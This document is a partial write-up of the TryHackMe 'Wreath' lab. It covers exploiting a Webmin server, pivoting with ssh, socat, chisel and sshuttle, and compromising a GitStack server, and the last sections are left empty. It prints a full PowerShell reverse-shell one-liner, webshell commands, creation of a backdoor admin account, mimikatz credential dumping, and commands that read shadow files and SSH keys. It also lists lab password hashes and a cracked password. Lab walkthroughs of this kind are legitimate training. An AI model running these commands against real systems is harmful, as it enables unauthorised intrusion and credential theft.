# Wreath - Easy

1. [Intro](#intro)
2. [Webserver](#webserver)
3. [Pivoting](#pivoting)
4. [Git Server](#git-server)
5. [Command and Control](#command-and-control)
6. [Personal PC](#personal-pc)
7. [AV Evasion](#av-evasion)
8. [Exfiltration](#exfiltration)
9. [Conclusion](#conclusion)

## Intro

* Given information:

  * 3 machines on the network
  * At least one public facing webserver
  * Self-hosted, internal git server on network
  * PC running on network with antivirus enabled (Windows)
  * Possibly server variant of Windows
  * Windows PC cannot be directly accessed from webserver

## Webserver

```shell
nmap -T4 -p 1-15000 -A -Pn -oX webserver.xml 10.200.81.200

sudo vim /etc/hosts
#add thomaswreath.thm

git clone https://github.com/MuirlandOracle/CVE-2019-15107
#clone exploit repo

cd CVE-2019-15107 && pip3 install -r requirements.txt

./CVE-2019-15107.py 10.200.81.200
#run exploit

#we get shell as root
id

#follow exploit 'shell' command
shell
#submit IP and listening port of attacker machine

nc -nvlp 4444
#we have reverse-shell now

python3 -c 'import pty;pty.spawn("/bin/bash")'

cat /etc/shadow

cat /root/.ssh/id_rsa
#copy contents

#in attacker machine
vim id_rsa
#paste private key

chmod 600 id_rsa
```

* We have to scan first 15000 ports of target.

* Open ports & services:

  * 22 - ssh - OpenSSH 8.0
  * 80 - http - Apache httpd 2.4.37 (centos)
  * 443 - ssl/http - Apache httpd 2.4.37 (centos)
  * 10000 - http - MiniServ 1.890 (Webmin httpd)

* In browser, the IP redirects us to the site <https://thomaswreath.thm/>, so we have to add this entry to our ```/etc/hosts``` file.

* We can access the webpage now; this is part of the 'footprinting' (OSINT) phase.

* Now, the version of the service used on port 10000 has a public exploit associated with it.

* We can clone the Github repo covering this exploit.

* Running the exploit against the target gives us shell on the webserver as root user.

* We can use the exploit to get a proper reverse-shell on attacker machine.

```markdown
1. How many of the first 15000 ports are open on the target? - 4

2. What OS does Nmap think is running? - centos

3. What site does the server try to redirect you to? - https://thomaswreath.thm/

4. What is Thomas' mobile phone number? - 447821548812

5. What server version does Nmap detect as running here? - MiniServ 1.890 (Webmin httpd)

6. What is the CVE number for this exploit? - CVE-2019-15107

7. Which user was the server running as? - root

8. What is the root user's password hash? - $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

9. What is the full path to this file? - /root/.ssh/id_rsa
```

## Pivoting

* Pivoting is the technique of using access obtained over one machine to exploit another machine in the network.

* Methods for pivoting:

  * Tunnelling/proxying
  * Port forwarding

* Ways to enumerate a network through a compromised host, in order of preference:

  * Using material found on the machine
  * Using pre-installed tools
  * Using statically compiled tools
  * Using scripting techniques
  * Using local tools through a proxy

* ```arp -a``` can be used to check ARP cache, which shows any IP addresses that the target has interacted with recently.

* Static mappings can be found in ```/etc/hosts``` or ```C:\Windows\System32\drivers\etc\hosts```; ```/etc/resolv.conf``` may identify local DNS servers.

* On Windows, ```ipconfig /all``` is used to check DNS servers; on Linux, ```nmcli dev show```.

* One-liner for full ping sweep of 192.168.1.x network:

```for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done```

* For proxying, we open a port on our attacking machine, which is linked to compromised server, giving us access to target network.

* Common proxy tools:

  * ```Proxychains``` - scanning through ```Proxychains``` is slow; should be configured according to use.

  * ```FoxyProxy``` - used to access a webapp through proxy.

* SSH tunnelling / port forwarding using SSH client:

  * Forward (local) connections:

  ```shell
  ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
  #ssh access to 172.16.0.5, and webserver running on 172.16.0.10
  #we can then access website on localhost:8000 from attacker machine
  #-f backgrounds shell, -N for not executing any commands

  #for proxying
  ssh -D 1337 user@172.16.0.5 -fN
  #opens port 1337 on attacker machine for proxy
  #can be used with proxychains
  ```

  * Reverse connections:

  ```shell
  ssh-keygen
  #generates ssh keys reverse, reverse.pub

  cat reverse.pub
  #copy pubkey contents
  #paste in ~/.ssh/authorized_keys in attacker machine

  #paste this line in beginning of authorized_keys file
  command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty

  sudo systemctl start ssh
  #start ssh service

  #transfer private key to target box
  #discard ssh keys after engagement

  ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i authorized_keys -fN
  #if we have shell on 172.16.0.5
  #and we want to give attacker 172.16.0.20 access to webserver 172.16.0.10

  #on attacker machine
  #to close ssh connections
  ps aux | grep ssh

  sudo kill 105328
  #kill ssh process
  ```

* ```plink.exe``` - used for pivoting in Windows; alternative to PuTTY SSH client:

```shell
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i id_rsa -N
#cmd.exe /c echo y for non-interactive shells
#here we have access to 172.16.0.5
#and we want to forward connection to 172.16.0.10:80 to port 8000 on attacker (172.16.0.20)

#ssh-keygen keys will not work

#on attacker machine
sudo apt install putty-tools

puttygen id_rsa -o key.ppk
#this .ppk can be used in Windows machine
#for reverse port forwarding
```

* ```socat```:

```shell
#on attacker machine
sudo python3 -m http.server 80

#on target
curl 10.50.73.2/socat -o /tmp/socat && chmod +x /tmp/socat

#port forwarding
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```

* ```chisel```:

  * Reverse SOCKS proxy:

  ```shell
  #move the chisel client-server files to the attacker & target systems

  #on attacker machine
  ./chisel server -p 4444 --reverse &
  #& backgrounds the process
  #jobs command can be used to see backgrounded jobs

  #on compromised host
  ./chisel client 10.50.73.2:4444 R:socks &
  #connect to listener & opens a proxy
  ```

  * Forward SOCKS proxy:

  ```shell
  #on compromised host
  ./chisel server -p 4444 --socks5

  #on attacker machine
  ./chisel client 172.16.0.10:4444 1337:socks
  #opens socks proxy on port 1337 of attacker machine
  ```

  * Remote port forward:

  ```shell
  #on attacker machine
  ./chisel server -p 4444 --reverse &

  #on target
  ./chisel client 172.16.0.20:4444 R:2222:172.16.0.10:22 &
  #forwards 172.16.0.10:22 back to port 2222 on attacker 172.16.0.20
  ```

  * Local port forward:

  ```shell
  #on target
  ./chisel server -p 4444

  #on attacker
  ./chisel client 172.16.0.5:4444 2222:172.16.0.10:22
  #to connect to target 172.16.0.5:4444
  #we forward local port 2222 to 172.16.0.10:22
  ```

```markdown
1. Which type of pivoting creates a channel through which information can be sent hidden inside another protocol? - Tunnelling

2. Which Metasploit Framework Meterpreter command can be used to create a port forward? - portfwd

3. What is the absolute path to the file containing DNS entries on Linux? - /etc/resolv.conf

4. What is the absolute path to the hosts file on Windows? - C:\Windows\System32\drivers\etc\hosts

5. How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash? - for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

6. What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242? - socks4 127.0.0.1 4242

7. What command would you use to telnet through a proxy to 172.16.0.100:23? - proxychains telnet 172.16.0.100 23

8. You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)? - FP

9. If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward? - L

10. Which switch combination can be used to background an SSH port forward or tunnel? - -fN

11. It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay? - Nay

12. What command would you use to create a pair of throwaway SSH keys for a reverse connection? - ssh-keygen

13. If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? - ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN

14. What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell? - ssh -D 8000 user@target.thm -fN

15. If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? - ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN

16. What tool can be used to convert OpenSSH keys into PuTTY style keys? - puttygen

17. Which socat option allows you to reuse the same listening port for more than one connection? - reuseaddr

18. If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? - ./socat tcp-l:8000 tcp:172.16.0.200:443

19. What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)? - ./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &

20. What command would you use to start a chisel server for a reverse connection on your attacking machine? - ./chisel server -p 4242 --reverse

21. What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process? - ./chisel client 172.16.0..200:4242 R:socks &

22. How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process. - ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

23. If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80? - ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80

24. How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16

25. What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?

26. You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
```

## Git Server

```shell
#connect to target as root using id_rsa key saved
ssh root@10.200.81.200 -i id_rsa

#on attacker machine
sudo python3 -m http.server 80

#on target root shell
curl 10.50.82.104/nmap -o /tmp/nmap-sv && chmod +x /tmp/nmap-sv

./nmap-sv -sn 10.200.81.1-255 -oN scan-sv
#scan network
#-sn to just check alive hosts

./nmap-sv -T4 -p 1-15000 -Pn -oX otherhosts-sv.xml 10.200.81.100 10.200.81.150
#scan the two hosts found

#we can use sshuttle for pivoting
#on attacker machine
sudo apt install sshuttle

sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i id_rsa" 10.200.81.0/24 -x 10.200.81.200
#establish proxy in 10.200.81.0/24 network with server 10.200.81.200
#-x to exclude server from subnet

searchsploit gitstack
#shows exploits

searchsploit -m 43777
#copies the exploit

dos2unix ./43777.py
#convert DOS line endings in local exploit to Linux line endings

vim 43777.py
#add python2 shebang
#edit IP to target IP
#edit backdoor file name to exploit-sv.php

./43777.py
#running the exploit
#we get 'whoami' executed

#backdoor has been uploaded
curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=whoami"

curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=hostname"

curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=systeminfo"

#to check if target is allowed to connect to external machines

#on attacker machine
sudo tcpdump -i tun0 icmp

#ping from target to attacker using backdoor webshell
curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=ping -n 3 10.50.82.104"
#0 packets make it to listener

#we can use nc to get shell on some port
#as server is using centos, we need to disable port on firewall-cmd
#in root ssh session
firewall-cmd --zone=public --add-port 23337/tcp

#get ncat binary from attacker machine
curl 10.50.82.104/ncat -o /tmp/ncat-sv && chmod +x /tmp/ncat-sv

./ncat-sv -nvlp 23337
#prod-serv listening on port 23337

#on attacker machine
#use powershell reverse-shell one-liner with webshell using curl
curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=<URL-encoded command>"

#we get PS reverse shell on our webserver
whoami
#nt authority\system

#stabilisation
#add user
net user sv Password3 /add

net localgroup Administrators sv /add

net localgroup "Remote Management Users" sv /add

#on attacker machine
#connect using evil-winrm to newly created user
evil-winrm -u sv -p Password3 -i 10.200.81.150

#we can also connect using RDP
xfreerdp /v:10.200.81.150 /u:sv /p:Password3 +clipboard /dynamic-resolution /drive:/home/sv/Tools,share

#in GUI, open cmd.exe as Administrator
#and run mimikatz.exe to dump hashes
\\tsclient\share\mimikatz64.exe
#loads mimikatz

privilege::debug

token::elevate

lsadump::sam

#in attacker machine
#use Administrator hash to connect via evil-winrm
evil-winrm -u Administrator -H <admin-hash-here> -i 10.200.81.150
```

* After uploading the ```nmap``` binary to target, we can scan the complete network.

* Now, ignoring the hosts ending in '.1' and '.250' according to given instructions, we have another 2 active hosts on the network - 10.200.81.100 and 10.200.81.150

* Scanning the two hosts that we found, 10.200.81.100 returns all ports as filtered.

* 10.200.81.150 has 3 open ports:

  * 80 - http
  * 3389 - ms-wbt-server
  * 5985 - wsman

* We can use pivoting technique with ```sshuttle``` to check the http service.

* After setting up the proxy using ```sshuttle```, we can access <http://10.200.81.150/>

* This page shows a 'Page Not Found' error; the page uses ```Django```, and it mentions the URL patterns 'registration/login/', 'gitstack/' and 'rest/'

* Checking ```gitstack``` shows that it is a Git server; using ```searchsploit``` we can see that this has RCE exploits.

* We can access the page <http://10.200.81.150/gitstack> - this contains a login page.

* We can try admin:admin as creds, but it does not work.

* We can attempt to use one of the RCE exploits we found earlier using ```searchsploit```.

* Configure the exploit and edit the IP field to '10.200.81.150'; also edit the backdoor file name to 'exploit-sv.php'.

* Running the exploit, this executes the ```whoami``` command and we can see that we are 'nt authority\system' user.

* As the backdoor has been uploaded, we can use ```curl``` to send POST requests for RCE instead of running the script again.

* We can begin with basic enumeration now.

* We also need to check if the target is allowed to connect to machines outside the network - we can use ```tcpdump``` and ```ping``` for this.

* We find out that the target cannot communicate with external machines.

* We can use the SSH session we have on compromised webserver as root, and upload ```nc``` binary to catch shell from target (10.200.81.150)

* We need to edit the ```firewall-cmd``` service on the root SSH session such that it allows port 23337 for connection.

* After setting up ```nc``` listener, we can now execute a Powershell reverse-shell one-liner, [URL-encoded](https://www.urlencoder.org/), and execute it using the webshell uploaded earlier:

```ps
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.81.200',23337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

* Now, we get RCE as system user on our SSH session in webserver as root.

* We can stabilise our presence by adding a user account, then using the open ports on this machine, we can connect via RDP on port 3389 using ```xfreerdp```, or WinRM on port 5985 with ```evil-winrm```.

* Connecting over ```xfreerdp```, we can use '/drive' flag to share our folder with the target machine - we can get ```mimikatz``` from this share.

* Open ```cmd.exe``` as Administrator, and run ```mimikatz``` to dump the hashes.

* NTLM hash for user 'Thomas' can be cracked to give password "i<3ruby"

```markdown
1. Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network? - 2

2. In ascending order, what are the last octets of these host IPv4 addresses? - 100,150

3. Scan the hosts -- which one does not return a status of "filtered" for every port? - 150

4. Which TCP ports below port 15000, are open on the remaining target? - 80,3389,5985

5. Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability? - http

6. What is the name of the program running the service? - gitstack

7. Do these default credentials work (Aye/Nay)? - Nay

8. There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit? - 43777

9. Look at the information at the top of the script. On what date was this exploit written? - 18.01.2018

10. Bearing this in mind, is the script written in Python2 or Python3? - Python2

11. What is the name of the cookie set in the POST request made on line 74 of the exploit? - csrftoken

12. What is the hostname for this target? - git-serv

13. What operating system is this target? - Windows

14. What user is the server running as? - nt authority\system

15. How many make it to the waiting listener? - 0

16. What is the Administrator password hash? - 37db630168e5f82aafa8461e05c6bbd1

17. What is the NTLM password hash for the user "Thomas"? - 02d90eda8f6b6b06c32d5f207831101f

18. What is Thomas' password? - i<3ruby
```

## Command and Control

## Personal PC

## AV Evasion

## Exfiltration

## Conclusion
